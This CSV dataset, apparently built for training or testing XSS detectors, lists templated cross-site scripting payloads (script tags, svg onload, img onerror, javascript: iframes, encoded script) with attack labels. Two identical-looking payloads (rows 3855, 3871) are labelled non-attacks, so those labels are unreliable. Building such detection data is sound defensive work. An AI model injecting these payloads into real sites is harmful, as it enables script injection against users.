id,description,payload,context,example_query,is_attack,attack_type
3766,Cross-Site Scripting (blended),comment=<script>alert(43034)</script>,Client-side Execution,Injected Script,Yes,XSS
3767,Cross-Site Scripting (blended),profile=<svg/onload=alert(80650)>,Client-side Execution,Injected Script,Yes,XSS
3768,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('d0aGeRgc')>,Client-side Execution,Injected Script,Yes,XSS
3769,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(54425)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3770,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(38304)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3771,Cross-Site Scripting (blended),comment=<script>alert(69766)</script>,Client-side Execution,Injected Script,Yes,XSS
3772,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(38871)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3773,Cross-Site Scripting (blended),profile=<svg/onload=alert(95470)>,Client-side Execution,Injected Script,Yes,XSS
3774,Cross-Site Scripting (blended),comment=<script>alert(43536)</script>,Client-side Execution,Injected Script,Yes,XSS
3775,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('q0nNkloE')>,Client-side Execution,Injected Script,Yes,XSS
3776,Cross-Site Scripting (blended),about=<b onclick=alert('kvjZosNj')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3777,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('2vTDOR5G')>,Client-side Execution,Injected Script,Yes,XSS
3778,Cross-Site Scripting (blended),comment=<script>alert(16726)</script>,Client-side Execution,Injected Script,Yes,XSS
3779,Cross-Site Scripting (blended),comment=<script>alert(50532)</script>,Client-side Execution,Injected Script,Yes,XSS
3780,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(14542)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3781,Cross-Site Scripting (blended),comment=<script>alert(54259)</script>,Client-side Execution,Injected Script,Yes,XSS
3782,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(8092)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3783,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(67556)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3784,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('GJkilzrY')>,Client-side Execution,Injected Script,Yes,XSS
3785,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(92037)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3786,Cross-Site Scripting (blended),comment=<script>alert(48120)</script>,Client-side Execution,Injected Script,Yes,XSS
3787,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('JfPMhrAu')>,Client-side Execution,Injected Script,Yes,XSS
3788,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(82710)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3789,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('xN2yBRee')>,Client-side Execution,Injected Script,Yes,XSS
3790,Cross-Site Scripting (blended),profile=<svg/onload=alert(67295)>,Client-side Execution,Injected Script,Yes,XSS
3791,Cross-Site Scripting (blended),profile=<svg/onload=alert(14172)>,Client-side Execution,Injected Script,Yes,XSS
3792,Cross-Site Scripting (blended),profile=<svg/onload=alert(21532)>,Client-side Execution,Injected Script,Yes,XSS
3793,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('rbirimgr')>,Client-side Execution,Injected Script,Yes,XSS
3794,Cross-Site Scripting (blended),comment=<script>alert(14309)</script>,Client-side Execution,Injected Script,Yes,XSS
3795,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(71870)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3796,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(23273)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3797,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(72603)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3798,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('7KcgAb2F')>,Client-side Execution,Injected Script,Yes,XSS
3799,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(87454)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3800,Cross-Site Scripting (blended),profile=<svg/onload=alert(46176)>,Client-side Execution,Injected Script,Yes,XSS
3801,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('uk3Ymset')>,Client-side Execution,Injected Script,Yes,XSS
3802,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(60766)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3803,Cross-Site Scripting (blended),profile=<svg/onload=alert(62747)>,Client-side Execution,Injected Script,Yes,XSS
3804,Cross-Site Scripting (blended),comment=<script>alert(42829)</script>,Client-side Execution,Injected Script,Yes,XSS
3805,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(20458)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3806,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('xMw8MM82')>,Client-side Execution,Injected Script,Yes,XSS
3807,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('IIq5Z375')>,Client-side Execution,Injected Script,Yes,XSS
3808,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(89233)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3809,Cross-Site Scripting (blended),about=<b onclick=alert('BWRGNMoH')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3810,Cross-Site Scripting (blended),about=<b onclick=alert('FOhCtBpi')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3811,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('ZpngzKmG')>,Client-side Execution,Injected Script,Yes,XSS
3812,Cross-Site Scripting (blended),profile=<svg/onload=alert(94498)>,Client-side Execution,Injected Script,Yes,XSS
3813,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(12747)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3814,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('venyEeTh')>,Client-side Execution,Injected Script,Yes,XSS
3815,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('4yiet4K1')>,Client-side Execution,Injected Script,Yes,XSS
3816,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(34572)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3817,Cross-Site Scripting (blended),profile=<svg/onload=alert(97735)>,Client-side Execution,Injected Script,Yes,XSS
3818,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('Yto99kZ3')>,Client-side Execution,Injected Script,Yes,XSS
3819,Cross-Site Scripting (blended),comment=<script>alert(31098)</script>,Client-side Execution,Injected Script,Yes,XSS
3820,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(82195)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3821,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('FK0QhiBh')>,Client-side Execution,Injected Script,Yes,XSS
3822,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('xmCTkEAz')>,Client-side Execution,Injected Script,Yes,XSS
3823,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('mPmosJhz')>,Client-side Execution,Injected Script,Yes,XSS
3824,Cross-Site Scripting (blended),comment=<script>alert(94257)</script>,Client-side Execution,Injected Script,Yes,XSS
3825,Cross-Site Scripting (blended),about=<b onclick=alert('ZQzIjoHE')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3826,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('AAyQVjq9')>,Client-side Execution,Injected Script,Yes,XSS
3827,Cross-Site Scripting (blended),profile=<svg/onload=alert(13525)>,Client-side Execution,Injected Script,Yes,XSS
3828,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('j3joCKWB')>,Client-side Execution,Injected Script,Yes,XSS
3829,Cross-Site Scripting (blended),about=<b onclick=alert('G3fZ2MQu')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3830,Cross-Site Scripting (blended),profile=<svg/onload=alert(93436)>,Client-side Execution,Injected Script,Yes,XSS
3831,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('lwSZ81sw')>,Client-side Execution,Injected Script,Yes,XSS
3832,Cross-Site Scripting (blended),profile=<svg/onload=alert(67008)>,Client-side Execution,Injected Script,Yes,XSS
3833,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(71573)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3834,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(57548)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3835,Cross-Site Scripting (blended),about=<b onclick=alert('bVcRbZML')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3836,Cross-Site Scripting (blended),comment=<script>alert(24379)</script>,Client-side Execution,Injected Script,Yes,XSS
3837,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(29121)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3838,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(98590)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3839,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(95807)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3840,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(14467)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3841,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(19462)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3842,Cross-Site Scripting (blended),profile=<svg/onload=alert(35283)>,Client-side Execution,Injected Script,Yes,XSS
3843,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(67155)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3844,Cross-Site Scripting (blended),about=<b onclick=alert('Qg1ut3sW')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3845,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(40077)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3846,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(35132)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3847,Cross-Site Scripting (blended),comment=<script>alert(95126)</script>,Client-side Execution,Injected Script,Yes,XSS
3848,Cross-Site Scripting (blended),comment=<script>alert(68301)</script>,Client-side Execution,Injected Script,Yes,XSS
3849,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(59255)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3850,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('wqkxe2Vy')>,Client-side Execution,Injected Script,Yes,XSS
3851,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('6HiE8IBg')>,Client-side Execution,Injected Script,Yes,XSS
3852,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('nyvhCIJU')>,Client-side Execution,Injected Script,Yes,XSS
3853,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(55963)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3854,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(85736)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3855,Cross-Site Scripting (blended),comment=<script>alert(58501)</script>,Client-side Execution,Injected Script,No,
3856,Cross-Site Scripting (blended),profile=<svg/onload=alert(96401)>,Client-side Execution,Injected Script,Yes,XSS
3857,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(18447)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3858,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(48525)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3859,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(20719)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3860,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(47027)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3861,Cross-Site Scripting (blended),about=<b onclick=alert('BMMRfcvy')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3862,Cross-Site Scripting (blended),profile=<svg/onload=alert(6606)>,Client-side Execution,Injected Script,Yes,XSS
3863,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('5nvzt9Ak')>,Client-side Execution,Injected Script,Yes,XSS
3864,Cross-Site Scripting (blended),about=<b onclick=alert('RMVEAn29')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3865,Cross-Site Scripting (blended),profile=<svg/onload=alert(72557)>,Client-side Execution,Injected Script,Yes,XSS
3866,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(8658)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3867,Cross-Site Scripting (blended),comment=<script>alert(8307)</script>,Client-side Execution,Injected Script,Yes,XSS
3868,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(19066)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3869,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(16186)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3870,Cross-Site Scripting (blended),comment=<script>alert(76213)</script>,Client-side Execution,Injected Script,Yes,XSS
3871,Cross-Site Scripting (blended),profile=<svg/onload=alert(25171)>,Client-side Execution,Injected Script,No,
3872,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(87883)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3873,Cross-Site Scripting (blended),profile=<svg/onload=alert(17404)>,Client-side Execution,Injected Script,Yes,XSS
3874,Cross-Site Scripting (blended),profile=<svg/onload=alert(15611)>,Client-side Execution,Injected Script,Yes,XSS
3875,Cross-Site Scripting (blended),comment=<script>alert(22978)</script>,Client-side Execution,Injected Script,Yes,XSS
3876,Cross-Site Scripting (blended),comment=<script>alert(5392)</script>,Client-side Execution,Injected Script,Yes,XSS
3877,Cross-Site Scripting (blended),comment=<script>alert(44609)</script>,Client-side Execution,Injected Script,Yes,XSS
3878,Cross-Site Scripting (blended),about=<b onclick=alert('2a6LKUkp')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3879,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(88181)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3880,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(97090)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3881,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('21sXrQ8R')>,Client-side Execution,Injected Script,Yes,XSS
3882,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('uZL10LKE')>,Client-side Execution,Injected Script,Yes,XSS
3883,Cross-Site Scripting (blended),comment=<script>alert(16861)</script>,Client-side Execution,Injected Script,Yes,XSS
3884,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(80343)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3885,Cross-Site Scripting (blended),profile=<svg/onload=alert(47240)>,Client-side Execution,Injected Script,Yes,XSS
3886,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(29915)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3887,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(83631)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3888,Cross-Site Scripting (blended),about=<b onclick=alert('OpW95Ywd')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3889,Cross-Site Scripting (blended),profile=<svg/onload=alert(29093)>,Client-side Execution,Injected Script,Yes,XSS
3890,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(23241)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3891,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('hIlPSzep')>,Client-side Execution,Injected Script,Yes,XSS
3892,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(94497)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3893,Cross-Site Scripting (blended),comment=<script>alert(25695)</script>,Client-side Execution,Injected Script,Yes,XSS
3894,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('oZAdGt9v')>,Client-side Execution,Injected Script,Yes,XSS
3895,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(36607)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3896,Cross-Site Scripting (blended),profile=<svg/onload=alert(81509)>,Client-side Execution,Injected Script,Yes,XSS
3897,Cross-Site Scripting (blended),profile=<svg/onload=alert(26897)>,Client-side Execution,Injected Script,Yes,XSS
3898,Cross-Site Scripting (blended),profile=<svg/onload=alert(16816)>,Client-side Execution,Injected Script,Yes,XSS
3899,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(8068)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3900,Cross-Site Scripting (blended),profile=<svg/onload=alert(41061)>,Client-side Execution,Injected Script,Yes,XSS
3901,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('QpTfjp5F')>,Client-side Execution,Injected Script,Yes,XSS
3902,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(85332)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3903,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(72433)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3904,Cross-Site Scripting (blended),profile=<svg/onload=alert(52019)>,Client-side Execution,Injected Script,Yes,XSS
